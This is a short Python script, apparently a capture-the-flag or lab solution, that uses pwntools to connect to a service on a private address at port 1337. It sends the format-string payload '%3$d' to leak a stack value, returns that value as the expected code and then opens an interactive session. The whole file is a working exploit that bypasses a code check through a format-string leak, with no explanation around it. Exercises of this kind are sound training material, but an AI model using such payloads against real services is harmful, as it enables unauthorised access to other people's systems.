#!/usr/bin/python3
from pwn import remote

shell = remote("192.168.100.64", 1337)

shell.recvuntil(b"CODE: ")
shell.sendline(b"%3$d")
shell.recvuntil(b"CODE: ")

code = shell.recvline().strip()
shell.sendline(code)
shell.recvuntil(b"CODE: ")

shell.interactive("")
